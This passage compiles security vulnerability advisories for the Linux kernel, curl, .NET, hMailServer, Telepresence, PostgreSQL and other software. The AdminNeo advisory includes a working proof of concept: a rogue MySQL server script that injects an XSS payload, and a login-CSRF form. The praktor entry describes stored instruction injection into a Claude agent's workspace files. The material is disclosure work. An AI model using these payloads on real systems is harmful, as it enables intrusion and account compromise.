receive the private keys the ACME client writes, the key of a certificate issued for the server's names among them; or to keep TLS ports from starting. The configuration is not the default: by default these files have names in ASCII, client certificates are off on every port, and the object store and ACME are off. The Linux builds are not affected.

Progressive Robot hMailServer 6.2.25 through 6.3.7 on Windows, with a PostgreSQL database, the connection's sslmode require, verify-ca or verify-full, and a root certificate file named by PostgreSQLSslRootCert (from 6.2.25) or, with TlsMode=verify-full and neither PostgreSQL key set, by TlsCaFile (from 6.3.4), hands the file's name to libpq as bytes in the system's ANSI code page (up to 6.3.5 as Latin-1 bytes, which on code page 1252 are the code page's own for U+00A0 to U+00FF), and libpq looks for the file by those bytes and then hands the same bytes to OpenSSL, whose file opening on Windows reads a name as UTF-8 first and opens the file at that reading when one is there. When every byte of the name outside ASCII also reads as UTF-8 - for example U+00C3 U+00A9, the bytes C3 A9 on code page 1252, which are U+00E9 in UTF-8 - the database server's certificate was checked against the file at that other name whenever one was there, which allows a local attacker who can create that file but cannot change the configured one, as any user can by default beside a file an administrator keeps under ProgramData, or beside a folder directly under the system drive's root whose permissions the administrator restricted, and who can intercept the connection to the database server or stand in for it, to have hMailServer trust a certificate authority of the attacker's own and read and modify the traffic between hMailServer and its database, the database password included; the file alone, holding no authority that issued the database server's certificate, stops hMailServer from connecting to its database. The same applies in 6.3.4 through 6.3.7 to TlsCaFile when an Oracle MySQL client library has been put in place of the bundled MariaDB Connector/C, since that client opens the file through OpenSSL in the same way; the bundled MariaDB Connector/C opens the file in the code page and is not affected, and neither are the Linux builds. The configuration is not the default: by default no root certificate file is named.

Telepresence enables local development against a remote Kubernetes or OpenShift cluster. Prior to 2.31.0, the Traffic Manager gRPC API on port 8081 accepts unauthenticated cluster-network callers, ArriveAsClient stores a caller-supplied Namespace using only the ManagesNamespace manager watchlist check, and CreateIntercept can target any managed namespace without checking the session's Kubernetes RBAC. An attacker operating any pod with network access to the manager can register in an arbitrary managed namespace, create service intercepts, receive intercepted traffic, and obtain the victim pod's complete container environment, including secrets, tokens, and API keys. The default cluster-wide deployment manages all namespaces. This vulnerability is fixed in 2.31.0.

In the Linux kernel, the following vulnerability has been resolved:

wifi: mt76: mt7996: unlink TWT flow if the MCU rejects the agreement

mt7996_mac_add_twt_setup() links a new flow into dev->twt_list before
asking the MCU to add the agreement, but exits without unlinking the flow
if the request fails. The flow-ID and table masks are only committed
after MCU success, so the still-linked flow is invisible to the
mask-gated teardown paths.

If the station retries the setup, the same slot is cleared and its
embedded list node reinitialized while it is still linked, corrupting
dev->twt_list. If the station disassociates instead, teardown skips the
flow and station storage can be freed while the node remains linked. A
later scheduling or debugfs twt_stats walk can then dereference the
freed flow, resulting in a use-after-free.

Unlink the flow when the MCU rejects the agreement. This restores the
list to its pre-request state while leaving the unchanged mask and
agreement accounting untouched.

In the Linux kernel, the following vulnerability has been resolved:

smb: server: size directory name conversion buffer correctly

A 2048-byte ASCII directory name needs 4098 bytes when converted to
UTF-16, including the terminator. ksmbd_convert_dir_info_name() caps
its allocation at PATH_MAX and writes past the end of that buffer.

Allocate space for one UTF-16 code unit per input byte plus the
terminator. Use kmalloc_array() to check the size calculation.

A logic issue was addressed with improved checks. This issue is fixed in Safari 27.2, iOS 26.7.2 and iPadOS 26.7.2, iOS 27.2 and iPadOS 27.2, macOS Golden Gate 27.2. A website may be able to use a media format that should be restricted in Lockdown Mode.

items.title: External protocol handler (tel:) address bar spoof
items.description: A malicious web page could open a tel link in a window that was showing a different website, causing the phone-call prompt to appear as if that site had requested the call. This vulnerability was fixed in Firefox for iOS 156.1.

items.description: A malicious web page could insert arbitrary text into the FaceTime call prompt shown by iOS, potentialy allowing it to display a phishing message inside system UI. This vulnerability was fixed in Firefox for iOS 156.1.

items.title: Heap exhaustion via unbounded simple string or bulk string allocation in Vert.x Redis client
items.description:
In Eclipse Vert.x versions [4.0.0, 4.5.35] or [5.0.0, 5.2.2], when a malicious server keeps sending bytes on an EOL-terminated line (not length-prefixed, for example a simple string [1]), we'll keep growing the buffer without bounds, eventually leading to an OOM. We need to have a configurable limit for EOL-terminated lines.



If a malicious server sends a specially crafted RESP response (for example a bulk string [2] with missing CRLF trailer), the parser enters an infinite loop where it keeps parsing the same buffer and pushing the same response to the caller, which may lead e.g. to an OOM if the consumer just buffers the responses. We must fix the parser to avoid this infinite looping.
A logic issue was addressed with improved state management. This issue is fixed in Safari 27, visionOS 27, watchOS 27. Processing maliciously crafted web content may lead to unexpected behavior.

A flaw in Node.js `crypto` causes the internal entropy caches used by `crypto.randomUUID()`, `crypto.randomUUIDv7()`, and `crypto.randomInt()` to be saved into user-land startup snapshots (`--build-snapshot`) and single executable applications built with `useSnapshot`.

If any of these functions, or an API that relies on them such as `URL.createObjectURL()`, is called while the snapshot is built, every process started from that snapshot returns the same values until the cache is refilled: up to 127 UUIDs and about 1,000 `randomInt()` values. Identifiers expected to be unique can collide across processes, and values issued by one process can be predicted by observing another.

This vulnerability affects Node.js **26.x**, **24.x**, and **22.x**.

Vulnerability in the Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Compiler).  Supported versions that are affected are Oracle Java SE: 8u511b33, 8u511b33-perf, 11.0.33.0.3, 17.0.21.0.3, 21.0.13.0.3, 25.0.5.0.3, 27.0.1.0.3; Oracle GraalVM for JDK: 17.0.21.0.3 and  21.0.13.0.3; Oracle GraalVM Enterprise Edition: 21.3.20.0.3. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition.  Successful attacks of this vulnerability can result in  unauthorized update, insert or delete access to some of Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data as well as  unauthorized read access to a subset of Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability can be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. This vulnerability also applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. CVSS 3.1 Base Score 4.8 (Confidentiality and Integrity impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N).

Poste Italiane Postecert FIRMAOK! 1.6.29 on Windows contains a local privilege escalation vulnerability caused by an uncontrolled OpenSSL search path, where launcher.exe and dependent executables such as updater.exe and tslupdater.exe load OpenSSL configuration and library files from a hardcoded, user-writable directory that does not exist by default. A low-privileged local attacker can create this missing directory and place malicious OpenSSL configuration or library files inside it, causing the application to load and execute attacker-controlled code with the privileges of the user running it, enabling horizontal or, when a higher-privileged user runs the application, vertical privilege escalation up to full system compromise.

Calling the wide scanf family of functions (swscanf, fwscanf, wscanf, vswscanf, vfwscanf and vwscanf) with a %s or %[ conversion without the 'l' length modifier in the GNU C Library version 2.2 to version 2.44 writes an extra null byte one past the end of the destination array when the converted multibyte string and its terminating null byte exactly fill that array.

These conversions store each wide input character into the caller's char array as a multibyte sequence.  The conversion ends with the sequence that returns to the initial shift state, which also stores the terminating null byte, and the functions then append a second null byte.  A destination sized for the converted string and one terminator, as the C standard requires the caller to provide, is therefore written one byte past its end.  The out-of-bounds byte is always a null byte, which may corrupt adjacent data or crash the process.  An attacker who supplies the input can trigger the overflow with a string whose converted length exactly fills the destination.

The narrow scanf functions, the %ls and %l[ conversions into a wchar_t array, and the 'a' and 'm' allocation modifiers are not affected, and storing a wide scanf conversion into a narrow char array is uncommon.  This issue affects all architectures and ABIs supported by the GNU C Library.

In the Linux kernel, the following vulnerability has been resolved:

vsock/vmci: validate packet source for connected sockets

vmci_transport_recv_stream_cb() looks up sockets first by the full source
and destination tuple, then by destination only in the bound table. The
fallback can select a non-listening socket without checking whether the
packet came from its stored peer.

This was reproduced with two VMCI contexts. A RST from the context not
stored in a TCP_SYN_SENT socket reset that socket after it was selected by
the destination-only lookup.

VMCI can process notification packets in bottom-half context when the
socket is not owned by user context, or defer packets to a workqueue. Use
vsock_check_source() after taking the socket lock in the bottom-half path,
and recheck after lock_sock() in the workqueue path. Listening sockets
continue to accept packets from any source.

Reply with a RST addressed from the received packet before dropping a
source that fails validation. This preserves the existing reset behavior
for bound non-listening and concurrently closed sockets without directing
the reset to a connected socket's stored peer.

items.title: .NET Denial of Service Vulnerability
items.description: Inefficient algorithmic complexity in .NET allows an unauthorized attacker to deny service over a network.

items.title: nodejs undici BalancedPool balanced-pool.js Object.assign prototype pollution
items.description: A security flaw has been discovered in nodejs undici up to 7.24.0. This affects the function Object.assign of the file balanced-pool.js of the component BalancedPool. The manipulation results in improperly controlled modification of object prototype attributes. The attack may be launched remotely. The exploit has been released to the public and may be used for attacks. Upgrading to version 7.24.1 is able to mitigate this issue. The patch is identified as 0d7ec33ff37563d3e7c98d11d7bca736f330d156. You should upgrade the affected component.

In the Linux kernel, the following vulnerability has been resolved:

smb: client: validate SMB1 EA list bounds before parsing

CIFSSMBQAllEAs() checks the server-provided EA list length by adding it
to the response pointer. On 32-bit systems, a positive length can wrap
the pointer and pass the comparison. The parser then walks outside the
received response while reading the next FEA header.

A response with a list length of 0x40000000 reproduces this as a native
i386 page fault and kernel panic from listxattr() against an SMB1
server.

Check that the EA list starts within the SMB byte area before reading
its header. Keep its length unsigned and compare it with the bytes left
in the response without pointer addition.

SMB1 is not negotiated by default and requires an explicit vers=1.0
mount.

Next.js is a React framework for building full-stack web applications. From 13.0.0 until 15.5.28 and 16.4.1, crafted requests targeting App Router applications with at least one Server Action can cause excessive CPU consumption and block processing of further requests in the same process. Applications using the Pages Router and App Router applications without Server Actions are not affected. This issue is fixed in versions 15.5.28 and 16.4.1.

django-docutils provides reStructuredText support for Django. Prior to 0.30.0, public rendering paths including publish_doctree, publish_html_from_source, publish_html_from_doctree, publish_parts_from_doctree, the {% rst %} template tag, the rst template filter, DocutilsTemplates, and DocutilsView pass lower-trust reStructuredText to Docutils without disabling file_insertion_enabled, raw_enabled, ambient docutils.conf processing, or unsafe URI schemes and without consistently sanitizing doctrees. An attacker who can influence rendered reStructuredText can use include or csv-table directives to read local files or cause server-side URL requests, or use raw HTML and unsafe URI output to inject stored script-capable content. Applications that render only trusted static reStructuredText are not affected unless attackers can influence it. This issue is fixed in version 0.30.0.

ImageMagick and GraphicsMagick use small modules, called "coders", to read each image format. When processing images, TYPO3 determined the coder from the file type detected by the file contents, as long as the detected mime-type started with image/. A file containing MVG (Magick Vector Graphics) instructions, uploaded with an image file extension like .png, was therefore processed with the MVG coder. MVG instructions can read local files into the processed image, which allows disclosing the contents of arbitrary files readable by the web server, for example configuration files containing credentials, through a publicly accessible processed image.

Exploiting this vulnerability requires a way to upload files without a mime-type check, for example a public form of the Form Framework using a FileUpload or ImageUpload element without configured allowedMimeTypes (see TYPO3-CORE-SA-2026-032), which allows exploitation by unauthenticated visitors. Additionally, ImageMagick must be used for image processing, and its default system configuration must allow the MVG coder.
External control of file name or path in Microsoft Exchange Server allows an authorized attacker to elevate privileges over a network.
Weak authentication in Microsoft Exchange Server allows an authorized attacker to elevate privileges over a network.

Allocation of Resources Without Limits or Throttling vulnerability in hackney_conn in benoitc hackney allows a malicious HTTP server to exhaust client memory via an oversized or highly compressed response body. hackney:request/5 and hackney:body/1 return the whole response body, and nothing bounds how much the connection process buffers. Any server the client requests can trigger it.

hackney_conn:read_full_body/2 and the HTTP/2 and HTTP/3 accumulators append every chunk until the body ends. With {auto_decompress, true} the buffered body is then inflated in one step with zlib:gunzip/1 or zlib:inflate/2, which return the whole output at once.

This issue affects hackney: from 2.0.0-beta.1 before 4.9.0.

praktor is a multi-agent Claude Code orchestrator with Telegram input and output, Docker isolation, and a Mission Control UI. Prior to 0.9.1, both Telegram upload sites in `internal/telegram/bot.go` concatenate the attacker-controlled document filename into a destination path without sanitization, and `path.Join` collapses parent-directory traversal. A remote Telegram user who can message the bot can therefore write outside `uploads/` within the persistent agent workspace mounted at `/workspace/agent`. Because `allow_from: []` permits all senders by default, no prior authentication or privilege is required in that configuration. The attacker can plant or overwrite `CLAUDE.md`, instruction, skill, hook, or configuration files that the Claude agent reads and operates on across later runs, turning a document upload into stored instruction injection. The demonstrated arbitrary-write scope is the persistent agent workspace volume, not an unrestricted host-filesystem write. This issue is fixed in version 0.9.1.

items.title: AdminNeo Vulnerable to XSS via Rogue MySQL Server Version String (CSP Nonce Bypass)
items.description:
## Summary

AdminNeo inserts the database server's version string into a `<script>` tag that carries a valid CSP nonce, without any sanitization. A rogue database server can return a crafted version string that breaks out of the JavaScript context and executes arbitrary code. Because the script tag already has a valid nonce, the browser's Content Security Policy does not block execution. No authentication is required when combined with Login CSRF.

Originally reported in Adminer: https://github.com/vrana/adminer/security/advisories/GHSA-h6jr-7pr6-grgj

## Prerequisites

- Target runs AdminNeo
- Attacker controls a reachable MySQL server (a 80-line Python script)

## Root Cause

`admin/core/Admin.php`, lines 1285-1286:

```php
echo script("let autocompletion;\nwindow.addEventListener('DOMContentLoaded', () => { initSyntaxHighlighting('" .
    Connection::get()->getVersion() . "', '" . Connection::get()->getFlavor() . "', autocompletion); });");
```

`script()` wraps the output in `<script nonce="VALID_NONCE">`. Return value of `Connection::get()->getVersion()` is not escaped.

## Steps To Reproduce

### 1. Build the environment

**Dockerfile** (AdminNeo):

```dockerfile
FROM php:8.3-cli
COPY adminneo.php /var/www/adminneo.php
WORKDIR /var/www
EXPOSE 8081
CMD ["php", "-S", "0.0.0.0:8081"]
```

**rogue_mysql.py** (fake MySQL server that accepts any login):

```python
import socket, struct, threading

PAYLOAD = "1');alert(origin)//"

# Capability flags the client expects
CAP_PROTOCOL_41     = 0x0200
CAP_SECURE_CONNECTION = 0x8000
CAP_PLUGIN_AUTH     = 0x00080000
CAPS_LOW  = CAP_PROTOCOL_41 | CAP_SECURE_CONNECTION
CAPS_HIGH = (CAP_PLUGIN_AUTH >> 16)

def make_packet(seq, payload):
    length = struct.pack("<I", len(payload))[:3]
    return length + bytes([seq]) + payload

def make_greeting(version_str):
    pkt  = b"\x0a"                                  # protocol version 10
    pkt += version_str.encode() + b"\x00"            # version string
    pkt += struct.pack("<I", 1)                      # connection id
    pkt += b"\x41" * 8                               # auth plugin data part 1
    pkt += b"\x00"                                   # filler
    pkt += struct.pack("<H", CAPS_LOW)               # capability flags lower
    pkt += b"\x21"                                   # charset utf8
    pkt += struct.pack("<H", 0x0002)                 # status flags
    pkt += struct.pack("<H", CAPS_HIGH)              # capability flags upper
    pkt += b"\x15"                                   # auth data length (21)
    pkt += b"\x00" * 10                              # reserved
    pkt += b"\x41" * 12 + b"\x00"                    # auth plugin data part 2
    pkt += b"mysql_native_password\x00"              # auth plugin name
    return make_packet(0, pkt)

def make_ok(seq):
    pkt  = b"\x00"          # OK marker
    pkt += b"\x00"          # affected rows
    pkt += b"\x00"          # last insert id
    pkt += struct.pack("<H", 0x0002)  # status flags
    pkt += struct.pack("<H", 0)       # warnings
    return make_packet(seq, pkt)

def make_eof(seq):
    pkt  = b"\xfe"
    pkt += struct.pack("<H", 0)       # warnings
    pkt += struct.pack("<H", 0x0002)  # status flags
    return make_packet(seq, pkt)

def make_err(seq, msg=b"not supported"):
    pkt  = b"\xff"
    pkt += struct.pack("<H", 1045)
    pkt += b"#HY000"
    pkt += msg
    return make_packet(seq, pkt)

def handle(conn):
    conn.sendall(make_greeting(PAYLOAD))
    try:
        conn.recv(4096)     # client login request
    except Exception:
        conn.close()
        return
    conn.sendall(make_ok(2))  # accept login

    # Answer any queries Adminer sends after login
    while True:
        try:
            data = conn.recv(4096)
            if not data:
                break
            seq = data[3] + 1
            # Send ERR for all queries (Adminer still has the version in memory)
            conn.sendall(make_err(seq))
        except Exception:
            break
    conn.close()

srv = socket.socket()
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind(("0.0.0.0", 3307))
srv.listen(5)
print("[*] Rogue MySQL on :3307 - version: " + PAYLOAD)
while True:
    conn, addr = srv.accept()
    print(f"[+] Connection from {addr}")
    threading.Thread(target=handle, args=(conn,)).start()
```

```shell
# Terminal 1: start Adminer
docker build -t adminer-xss .
docker run -d -p 8081:8081 --name adminer-xss adminer-xss

# Terminal 2: start rogue MySQL
python3 rogue_mysql.py
```

### 2. Trigger the XSS

Open a browser and navigate to `http://localhost:8081/adminneo.php`:

1. Select driver: **MySQL**
2. Server: `HOST_IP:3307` (IP of the machine running rogue_mysql.py)
3. Username: `root`
4. Password: `x`
5. Click Login.

The rogue server accepts the login. AdminNeo renders the dashboard and includes:

```html
<script nonce="REAL_NONCE">let autocompletion;
window.addEventListener('DOMContentLoaded', () => { initSyntaxHighlighting('1');alert(origin)//', 'mysql', autocompletion); });</script>
```

The browser executes `alert(origin)` with full CSP bypass because the script tag carries a valid nonce.

### 3. Trigger it via Login CSRF

The login form has no CSRF token. An attacker page auto-submits the login, forcing the victim's browser to connect to the rogue server:

```html
<form id="f" method="POST" action="http://TARGET/adminneo.php">
  <input name="auth[driver]" value="mysql">
  <input name="auth[server]" value="ROGUE_IP:3307">
  <input name="auth[username]" value="root">
  <input name="auth[password]" value="x">
</form>
<script>document.getElementById('f').submit()</script>
```

## Collaborator Request

This vulnerability was discovered jointly with Yashar Shahinzadeh (GitHub: @Voorivex). Could you please add him as a collaborator on this advisory and credit him as a co-discoverer? Thank you!

Telepresence enables local development against a remote Kubernetes or OpenShift cluster. Prior to 2.31.0, the Traffic Manager Tunnel gRPC streaming endpoint parses a session ID from the first bytes of a caller-controlled message in pkg/tunnel/message.go and passes it to state.Tunnel without verifying that the caller owns the active session. An attacker who obtains a valid active session ID through log leakage, cluster-internal channels, or the unauthenticated ArriveAsClient endpoint can attach a routed tunnel to that session and gain its network routing capabilities. UUID4 session IDs make cold brute force impractical. This vulnerability is fixed in 2.31.0.

A buffer overflow vulnerability in Palo Alto Networks PAN-OS® software enables an unauthenticated attacker with network access to cause a denial of service (DoS) condition by sending specially crafted network traffic to or through a dataplane interface.



Cloud NGFW and Panorama are not affected by this vulnerability.

By permanently omitting the final control-response line, a malicious FTP,
IMAP, POP3, or SMTP server can exploit libcurl and completely bypass its
configured transfer timeout mechanism, indefinitely blocking all concurrent
transfers bound to the same multi-handle.
Improper authentication in ASP.NET Core allows an unauthorized attacker to elevate privileges over a network.
Improper access control in Microsoft Exchange Server allows an authorized attacker to perform spoofing over a network.

Type confusion in PostgreSQL extended statistics allows an object creator to execute arbitrary code as the operating system user running the database, via a statistics expression of an anonymous RECORD type whose backend-local type identifier denotes a different row type in another session.  Versions before PostgreSQL 18.7, 17.12, 16.16, 15.20, and 14.25 are affected.
Improper authentication in ASP.NET Core allows an unauthorized attacker to elevate privileges over a network.
Concurrent execution using shared resource with improper synchronization ('race condition') in Windows Internet Information Services allows an unauthorized attacker to execute code over a network.

Time-of-check time-of-use (TOCTOU) race condition vulnerability in Apache Tomcat when creating unix domain sockets for the APR/Native connector allows an unauthorised local user to access the unix domain socket. The fix for CVE-2026-65183 only addressed the NIO connector. It did not address the same issue in the APR/Native connector.



This issue affects Apache Tomcat: from 9.0.47 through 9.0.122.



Users are recommended to upgrade to version 9.0.123, which fixes the issue.

libcurl's TFTP state machine fails to validate state transitions against the
requested transfer direction, accepting opening server responses for both
reads and writes interchangeably. A malicious TFTP server can respond to a
download request in a way that forces the client into transmit mode, prompting
libcurl to consume and transmit data from the handle's persistent
`CURLOPT_READDATA` pointer - including data remaining from unrelated prior
operations, such as an HTTP POST request executed on a reused handle.

When curl is built with GnuTLS, a malicious WebSocket server can make curl
send memory past its send buffer. This is due to an out of bounds read
following when `gnutls_record_send()` returns a number of bytes sent **greater
than the number of bytes it was given to send**. GnuTLS does that after a
blocked send.

In the Linux kernel, the following vulnerability has been resolved:

net/sched: cls_flower: validate mask pointer after nla_next()

fl_set_enc_opt() iterates the key's nested tunnel-option attributes
with nla_for_each_attr() while advancing a single mask pointer via
nla_next() at the bottom of each loop, so the mask cursor is driven
by the number of key attributes rather than by the mask's own
attributes.  The nla_ok() added by commit c96adff956191 ("cls_flower:
call nla_ok() before nla_next()") only validates the mask pointer
that was just consumed; the pointer produced by nla_next() is used by
the next iteration (fl_set_geneve_opt() and siblings) without any
validation.

The mask's nested attributes are validated with NL_VALIDATE_LIBERAL,
which merely warns on trailing bytes that do not form a complete
attribute.  A mask carrying one valid attribute plus 1-3 residue
bytes (or a non-aligned attribute length making msk_depth negative)
therefore reaches the next iteration with msk_depth != 0, so neither
the !msk_depth check in fl_set_enc_opt() nor the !depth check in the
per-type helpers fires.  nla_type() then reads past the mask payload
and nla_parse_nested_deprecated() iterates with an nla_len taken
from those bytes, reading well beyond the mask attribute (KASAN:
slab-out-of-bounds read in __nla_validate_parse from fl_change()).

Validate the advanced mask pointer as well: when the mask is not
legitimately exhausted (msk_depth != 0) and the new pointer fails
nla_ok(), reject the filter with -EINVAL.  An exactly exhausted mask
still skips the check, preserving exact-match behaviour for the
remaining key attributes.

In the Linux kernel, the following vulnerability has been resolved:

vsock/virtio: validate packet source for connected sockets

virtio_transport_recv_pkt() looks up sockets first by the full source and
destination tuple, then by destination only in the bound table. The
fallback is needed for listening and connecting sockets, but sockets remain
in the bound table after connect(), so it can also return a non-listening
socket.

The fallback does not validate the source address. In TCP_SYN_SENT, a
RESPONSE from an unrelated source can transition the victim socket to
TCP_ESTABLISHED while its stored remote address remains unchanged.
Subsequent RW packets from that source are delivered through the same
destination-only fallback.

This was reproduced with capability-empty processes under different UIDs.
The attacker discovered the target tuple through unprivileged AF_VSOCK
sock_diag and caused the victim socket to read 16 attacker-chosen bytes;
the intended peer-side socket read 0 of those 16 bytes.

Add vsock_check_source() to validate the transport, source port and source
CID against the peer stored in a non-listening socket. The local transport
is the CID exception because its packets are generated internally with
VMADDR_CID_LOCAL as their source, including connections using CID aliases.

Use the helper after lock_sock() in the virtio receive path.

In the Linux kernel, the following vulnerability has been resolved:

tracing: Check operator stack capacity before pushing

predicate_parse() uses the first operator stack entry before processing
any opening parentheses. A push then increments top before writing.
The existing check still permits that write when top already points to
the last allocated entry, which can access beyond the operator stack.

Reject the push when top reaches the last allocated entry.

items.title: Microsoft Security Advisory CVE-2026-111497 - .NET Brotli Decoder Out-of-bounds Write Vulnerability
items.description: ## Executive summary A buffer overflow vulnerability exists in the Brotli decompression library used by .NET. This vulnerability may allow an unauthenticated attacker to read or corrupt process memory. This could lead to information disclosure, denial of service, or elevation of privilege. ASP.NET Core and HttpClient do not automatically decompress Brotli data in their default configurations. Applications are exposed when they enable Brotli decompression or explicitly use Brotli decompression APIs to process attacker-controlled data, as described below. .NET Framework is not affected. ## Announcement Announcement for this issue can be found at https://github.com/dotnet/announcements/issues/494 ## CVSS Details - **Version:** 3.1 - **Severity:** High - **Score:** 8.1 - **Vector:** `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:U/RL:O/RC:C` - **Weakness:** CWE-787 (Out-of-bounds Write) ## Affected Platforms - **Platforms:** All - **Architectures:** All ## Mitigations ASP.NET Core request decompression and HttpClient automatic response decompression are not enabled by default. An application is not exposed merely because an affected .NET package is installed. Exposure requires the application to decompress attacker-controlled Brotli data through one of these paths: - Enable ASP.NET Core [automatic request decompression](https://learn.microsoft.com/aspnet/core/fundamentals/middleware/request-decompression) with Brotli (`br`) support. - Enable HttpClient automatic response decompression by configuring [HttpClientHandler.AutomaticDecompression](https://learn.microsoft.com/dotnet/api/system.net.http.httpclienthandler.automaticdecompression) or [SocketsHttpHandler.AutomaticDecompression](https://learn.microsoft.com/dotnet/api/system.net.http.socketshttphandler.automaticdecompression) to include [DecompressionMethods.Brotli](https://learn.microsoft.com/dotnet/api/system.net.decompressionmethods) or `DecompressionMethods.All`. - Explicitly use Brotli decompression APIs in `System.IO.Compression`, such as `BrotliStream` or `BrotliDecoder`. Until the update can be deployed, avoid decompressing attacker-controlled Brotli data. The following examples show how to disable Brotli decompression if you are already using it. > **Warning: Do not use these code snippets if you are not already using decompression.** Do not introduce a call to `AddRequestDecompression` if your application does not already call it. Similarly, do not introduce an `AutomaticDecompression` property assignment if your application does not already set that property. Modify only your existing decompression configuration. Enabling automatic decompression can introduce denial-of-service risks even when Brotli is excluded. If you are already using Brotli request decompression in ASP.NET Core, exclude it by removing the `br` entry from your existing decompression configuration. This retains the default gzip and deflate providers: ```csharp builder.Services.AddRequestDecompression(options => { options.DecompressionProviders.Remove("br"); }); ``` If your application already enables HttpClient automatic response decompression, disable Brotli by updating the flags on your existing handler so they do not include `DecompressionMethods.Brotli`: ```csharp var handler = new HttpClientHandler { AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate }; var httpClient = new HttpClient(handler); ``` Applications that directly use Brotli decompression APIs must stop passing untrusted Brotli data to those APIs until updated. Ensure that other application code does not continue to decompress the same untrusted Brotli data. These changes can affect normal request and response handling and should be tested before deployment. Installing the security update remains the recommended fix. ## Affected Packages The vulnerability affects .NET applications using an affected Brotli decoder in the runtime or NativeAOT packages listed below. ### .NET 8 Package name | Affected version | Patched version ------------ | ---------------- | --------------- [Microsoft.DotNet.ILCompiler](https://www.nuget.org/packages/Microsoft.DotNet.ILCompiler) | >= 8.0.0, < 8.0.33 | 8.0.33 [Microsoft.NETCore.App.Runtime.NativeAOT.ios-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.ios-arm64) | >= 8.0.0, < 8.0.33 | 8.0.33 11.0.0-rc.3.26522.148 | 11.0.0-rc.3.26522.148 ## Advisory FAQ ### How do I know if I am affected? You are affected if your application uses an affected Brotli decoder included in a package listed in [affected packages](#affected-packages), including a decoder linked into a NativeAOT application, to decompress attacker-controlled data. See [mitigations](#mitigations) for the affected usage paths and default settings. ### How do I fix the issue? Install the updated runtime or SDK for the .NET version used by your application. If your application directly references an affected package, update that reference to the patched version listed above. .NET release | Runtime | SDK versions ------------ | ------- | ------------ .NET 8 | 8.0.33 | 8.0.133, 8.0.427 .NET 9 | 9.0.22 | 9.0.123, 9.0.320 .NET 10 | 10.0.14 | 10.0.114, 10.0.403 .NET 11 previews | 11.0.0-rc.3.26522.148 | 11.0.100-rc.3.26522.148 Download .NET from https://dotnet.microsoft.com/download/dotnet. Once you have installed the updated runtime or SDK, restart your apps for the update to take effect. If you have deployed [self-contained applications](https://learn.microsoft.com/dotnet/core/deploying/#self-contained-deployments), rebuild and redeploy those applications with the updated runtime. For NativeAOT applications, update the SDK and any explicit compiler or runtime-pack references to patched versions, then republish and redeploy the application.
